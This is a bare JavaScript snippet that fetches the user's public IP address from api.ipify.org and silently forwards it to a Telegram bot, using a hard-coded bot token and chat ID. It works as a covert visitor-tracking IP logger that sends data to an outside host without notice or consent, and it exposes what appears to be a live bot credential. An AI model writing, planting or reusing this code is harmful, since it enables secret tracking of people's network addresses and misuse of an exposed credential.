    const botToken = '5842052714:AAHaPBVhmRKh007YyHigkCYOtzy15guj04s';
    const chatId = '5693475657';
    
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip;
        console.log(`IP Address: ${ipAddress}`);
        
        // Send message to Telegram bot
        const message = `IP Address: ${ipAddress}`;
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
        fetch(telegramUrl);
      });

